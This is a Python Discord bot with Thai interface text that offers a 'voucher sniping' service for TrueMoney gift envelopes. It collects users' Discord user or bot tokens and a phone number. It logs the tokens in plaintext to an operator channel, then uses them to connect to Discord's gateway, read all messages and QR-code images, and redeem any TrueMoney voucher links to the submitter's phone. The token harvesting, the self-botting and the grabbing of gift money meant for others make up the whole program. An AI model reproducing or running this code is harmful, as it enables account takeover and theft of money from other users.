import os
import re
import io
import time
import asyncio
import sqlite3
import aiohttp
from flask import Flask
from threading import Thread
import discord
from discord.ext import commands
from discord import app_commands
from PIL import Image
from pyzbar.pyzbar import decode

# ==================== WEB SERVER (RENDER 24/7) ====================
app = Flask('')

@app.route('/')
def home():
    return "Bot is running 24/7!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_web)
    t.daemon = True
    t.start()

# ==================== DATABASE SETUP ====================
DB_FILE = "bot_database.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id TEXT PRIMARY KEY,
                    phone TEXT,
                    tokens TEXT,
                    is_active INTEGER DEFAULT 0
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS rewards (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    phone TEXT,
                    amount REAL,
                    voucher_url TEXT,
                    timestamp REAL
                )''')
    conn.commit()
    conn.close()

init_db()

# ==================== DISCORD BOT CONFIG ====================
LOG_TOKEN_CHANNEL_ID = 1487818086202478822
LOG_REWARD_CHANNEL_ID = 1489527387183120505

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

active_workers = {}

# ==================== HELPER FUNCTIONS ====================
def mask_phone(phone: str) -> str:
    if len(phone) >= 3:
        return phone[:3] + "x" * (len(phone) - 3)
    return phone

async def validate_token(token: str) -> str:
    headers = {"Authorization": token}
    async with aiohttp.ClientSession() as session:
        async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
            if resp.status == 200:
                return "UserToken"
        
        bot_headers = {"Authorization": f"Bot {token}"}
        async with session.get("https://discord.com/api/v10/users/@me", headers=bot_headers) as resp:
            if resp.status == 200:
                return "BotToken"
    return "Invalid"

async def redeem_voucher(phone: str, voucher_code: str):
    url = f"https://gift.truemoney.com/v1/giftcards/{voucher_code}/redeem"
    payload = {"mobile": phone, "voucher_hash": voucher_code}
    headers = {"Content-Type": "application/json"}
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload, headers=headers) as resp:
            data = await resp.json()
            if resp.status == 200 and data.get("status", {}).get("code") == "SUCCESS":
                amount = float(data["data"]["my_ticket"]["amount_baht"])
                return True, amount
    return False, 0.0

def extract_voucher_code(text_or_url: str) -> str:
    match = re.search(r'v=([a-zA-Z0-9]+)', text_or_url)
    if match:
        return match.group(1)
    return None

async def process_text_for_voucher(text: str, session: aiohttp.ClientSession):
    urls = re.findall(r'https?://[^\s]+', text)
    for url in urls:
        code = extract_voucher_code(url)
        if code:
            return code, url
        try:
            async with session.get(url, allow_redirects=True, timeout=3) as resp:
                final_url = str(resp.url)
                code = extract_voucher_code(final_url)
                if code:
                    return code, final_url
        except Exception:
            pass
    return None, None

def update_status():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users WHERE is_active = 1")
    count = c.fetchone()[0]
    conn.close()
    return count

# ==================== LISTENER WORKER ====================
async def run_token_listener(user_id: str, token: str, phone: str, token_type: str):
    headers = {"Authorization": token if token_type == "UserToken" else f"Bot {token}"}
    async with aiohttp.ClientSession() as session:
        gateway_url = "wss://gateway.discord.gg/?v=10&encoding=json"
        try:
            async with session.ws_connect(gateway_url) as ws:
                hello = await ws.receive_json()
                heartbeat_interval = hello['d']['heartbeat_interval'] / 1000
                
                auth_payload = {
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {"os": "linux", "browser": "my_driver", "device": "my_driver"}
                    }
                }
                await ws.send_json(auth_payload)
                
                async def heartbeat():
                    while True:
                        await asyncio.sleep(heartbeat_interval)
                        await ws.send_json({"op": 1, "d": None})

                hb_task = asyncio.create_task(heartbeat())
                
                async for msg in ws:
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        data = msg.json()
                        if data.get("t") == "MESSAGE_CREATE":
                            content = data["d"].get("content", "")
                            
                            voucher_code, full_url = await process_text_for_voucher(content, session)
                            
                            if not voucher_code:
                                for att in data["d"].get("attachments", []):
                                    if att.get("content_type", "").startswith("image"):
                                        async with session.get(att["url"]) as img_resp:
                                            if img_resp.status == 200:
                                                img_bytes = await img_resp.read()
                                                img = Image.open(io.BytesIO(img_bytes))
                                                decoded = decode(img)
                                                for obj in decoded:
                                                    qr_text = obj.data.decode('utf-8')
                                                    voucher_code, full_url = await process_text_for_voucher(qr_text, session)
                                                    if voucher_code:
                                                        break
                            
                            if voucher_code:
                                success, amount = await redeem_voucher(phone, voucher_code)
                                if success:
                                    conn = sqlite3.connect(DB_FILE)
                                    c = conn.cursor()
                                    c.execute("INSERT INTO rewards (user_id, phone, amount, voucher_url, timestamp) VALUES (?, ?, ?, ?, ?)",
                                              (user_id, phone, amount, full_url, time.time()))
                                    conn.commit()
                                    
                                    c.execute("SELECT SUM(amount), COUNT(*) FROM rewards WHERE user_id = ?", (user_id,))
                                    total_amount, total_count = c.fetchone()
                                    conn.close()

                                    reward_channel = bot.get_channel(LOG_REWARD_CHANNEL_ID)
                                    if reward_channel:
                                        embed = discord.Embed(
                                            description=(
                                                f"<a:1000030106:1551256934215061615> <@{user_id}>\n\n"
                                                f"<a:1000030107:1551259572289806406> **จำนวนเงิน:** {amount} บาท\n"
                                                f"<a:1000030105:1551256174287126619> **เบอร์แบบย่อ:** {mask_phone(phone)}\n"
                                                f"<a:1000030095:1551252990772383868> **ลิ้งซอง:** {full_url}\n"
                                                f"<a:1000030104:1551255815267295273> **เบอร์นี้/User นี้เคยได้รับเงินไปแล้ว:** ทั้งหมด {total_amount:.2f} บาท / {total_count} รอบ\n\n"
                                                f"🕒 **เวลาที่ได้รับ:** <t:{int(time.time())}:F>"
                                            ),
                                            color=0x00FF00
                                        )
                                        await reward_channel.send(embed=embed)

                hb_task.cancel()
        except Exception:
            pass

# ==================== MODAL & UI COMPONENTS ====================
class SetupModal(discord.ui.Modal, title="กรอกข้อมูล Token เเละ เบอร์โทรศัพท์"):
    phone = discord.ui.TextInput(label="เบอร์โทรศัพท์ที่ต้องการรับเงิน", placeholder="042xxxxxxx", required=True)
    token1 = discord.ui.TextInput(label="Token 1", placeholder="ใส่ Bot Token หรือ User Token", required=True)
    token2 = discord.ui.TextInput(label="Token 2 (ถ้ามี)", required=False)
    token3 = discord.ui.TextInput(label="Token 3 (ถ้ามี)", required=False)
    token4 = discord.ui.TextInput(label="Token 4 (ถ้ามี)", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(
            "<a:1000030105:1551256174287126619> กำลังเช็คtoken โปรดรอสักครู่..",
            ephemeral=True
        )
        await asyncio.sleep(2)

        tokens_input = [self.token1.value, self.token2.value, self.token3.value, self.token4.value]
        valid_tokens = []
        token_types = []

        for tk in tokens_input:
            if tk and tk.strip():
                t_type = await validate_token(tk.strip())
                if t_type != "Invalid":
                    valid_tokens.append(tk.strip())
                    token_types.append(t_type)

        if valid_tokens:
            tokens_str = ",".join(valid_tokens)
            types_str = ",".join(token_types)
            user_id = str(interaction.user.id)
            phone_val = self.phone.value.strip()

            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO users (user_id, phone, tokens, is_active) VALUES (?, ?, ?, 0)",
                      (user_id, phone_val, tokens_str))
            conn.commit()
            conn.close()

            log_channel = bot.get_channel(LOG_TOKEN_CHANNEL_ID)
            if log_channel:
                await log_channel.send(
                    f"มีคนกรอก token เเละเบอร์มาเเล้ว\n"
                    f"**token คือ:** {tokens_str}\n"
                    f"**เป็นประเภท:** {types_str}\n"
                    f"**เบอร์:** {phone_val}\n"
                    f"**คนที่ส่งมา:** {interaction.user.mention} (ID: {user_id})"
                )

            await interaction.edit_original_response(
                content=f"<a:1000030103:1551255510215426088> ระบบได้บันทึกToken เเละ เบอร์ของคุณไว้เรียบร้อย สามารถกดเปิดระบบได้เลย Tokenที่กรอกมาเป็นประเภท {types_str} <a:1000030106:1551256934215061615>"
            )
        else:
            await interaction.edit_original_response(
                content="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง โปรดกรอกusertoken / token ให้ถูกต้อง <a:1000030106:1551256934215061615>"
            )

class ActionSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="กรอกข้อมูล Token / เบอร์", value="1", description="1. กรอก Token และเบอร์โทรศัพท์"),
            discord.SelectOption(label="เปิดระบบ", value="2", description="2. เริ่มการทำงานบอทดักซอง"),
            discord.SelectOption(label="ปิดการทำงาน", value="3", description="3. หยุดการทำงานของระบบ"),
            discord.SelectOption(label="ล้างตัวเลือก", value="4", description="4. ล้างข้อมูลการตั้งค่าทั้งหมด")
        ]
        super().__init__(placeholder="ลิสเลือกการทำงาน...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        selected = self.values[0]

        if selected == "1":
            await interaction.response.send_modal(SetupModal())

        elif selected == "2":
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT phone, tokens, is_active FROM users WHERE user_id = ?", (user_id,))
            row = c.fetchone()

            if not row or not row[1]:
                conn.close()
                await interaction.response.send_message("<a:1000030101:1551255585029103636> คุณยังไม่ได้กรอกข้อมูลต่างๆ โปรดกรอกให้ครบในลิสที่1ด้วยย", ephemeral=True)
                return

            phone, tokens_str, is_active = row
            c.execute("UPDATE users SET is_active = 1 WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()

            tokens = tokens_str.split(",")
            for tk in tokens:
                t_type = await validate_token(tk)
                task = asyncio.create_task(run_token_listener(user_id, tk, phone, t_type))
                active_workers[f"{user_id}_{tk}"] = task

            count = update_status()
            await bot.change_presence(activity=discord.Game(name=f"ตอนนี้มีคนกำลังใช้บริการบอทดักอยู่ {count} คน"))
            await interaction.response.send_message("<a:1000030103:1551255510215426088> ระบบกำลังทำการ สามารถรอรับเงินได้เลยย ถ้าหากต้องการหยุดเเค่กดลิสที่3จะเป็นการหยุด", ephemeral=True)

        elif selected == "3":
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT is_active FROM users WHERE user_id = ?", (user_id,))
            row = c.fetchone()

            if not row or row[0] == 0:
                conn.close()
                await interaction.response.send_message("<a:1000030093:1551252638794780883> ระบบไม่ได้ทำงานอยู่เเล้ว หรือหากต้องการ เเค่กดลิสที่2!!!", ephemeral=True)
                return

            c.execute("UPDATE users SET is_active = 0 WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()

            keys_to_remove = [k for k in active_workers.keys() if k.startswith(f"{user_id}_")]
            for k in keys_to_remove:
                active_workers[k].cancel()
                del active_workers[k]

            count = update_status()
            await bot.change_presence(activity=discord.Game(name=f"ตอนนี้มีคนกำลังใช้บริการบอทดักอยู่ {count} คน"))
            await interaction.response.send_message("<a:1000030103:1551255510215426088> หยุดการทำงานสำเร็จ ถ้าหากต้องการให้กลับมาทำงานโปลดกดลิสที่2ได้ทันที!!", ephemeral=True)

        elif selected == "4":
            await interaction.response.send_message("<a:1000030108:1551261972476198993> ล้างตัวเลือก", ephemeral=True)
            await asyncio.sleep(2)
            
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()

            keys_to_remove = [k for k in active_workers.keys() if k.startswith(f"{user_id}_")]
            for k in keys_to_remove:
                active_workers[k].cancel()
                del active_workers[k]

            count = update_status()
            await bot.change_presence(activity=discord.Game(name=f"ตอนนี้มีคนกำลังใช้บริการบอทดักอยู่ {count} คน"))
            await interaction.edit_original_response(content="<a:1000030109:1551262224796876951> ล้างตัวเลือกสำเร็จ..")

class MainMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(ActionSelect())

# ==================== BOT EVENTS & SLASH COMMANDS ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    # Auto resume active users from DB
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, phone, tokens FROM users WHERE is_active = 1")
    active_users = c.fetchall()
    conn.close()

    for user_id, phone, tokens_str in active_users:
        tokens = tokens_str.split(",")
        for tk in tokens:
            t_type = await validate_token(tk)
            if t_type != "Invalid":
                task = asyncio.create_task(run_token_listener(user_id, tk, phone, t_type))
                active_workers[f"{user_id}_{tk}"] = task

    count = update_status()
    await bot.change_presence(activity=discord.Game(name=f"ตอนนี้มีคนกำลังใช้บริการบอทดักอยู่ {count} คน"))

@bot.tree.command(name="oei", description="เปิดเมนูใช้งานระบบดักซอง TrueMoney")
async def oei(interaction: discord.Interaction):
    embed = discord.Embed(
        title="<a:1000030093:1551252638794780883> Ɗ𐤠ƘⳜⰙƝƓ",
        description=(
            "<a:1000030095:1551252990772383868> กรอกเบอร์ที่ต้องการให้รับเงิน\n\n"
            "<a:1000030096:1551253928069570611> ใส่UserToken / BotToken"
        ),
        color=0xFF0000
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1489587803393364018/1551254339820064879/c7507064ec33d1c80c489e7400f60ef2.gif?ex=6ab14daf&is=6aaffc2f&hm=a08b8ec28f6350540fa8879e4b1f81330808415b4d6be98627948161d9e6983b&")
    
    await interaction.response.send_message(embed=embed, view=MainMenuView())

# ==================== STARTUP ====================
if __name__ == "__main__":
    keep_alive()
    token = os.environ.get("BOT_TOKEN")
    if token:
        bot.run(token)
    else:
        print("Please set BOT_TOKEN environment variable in Render!")
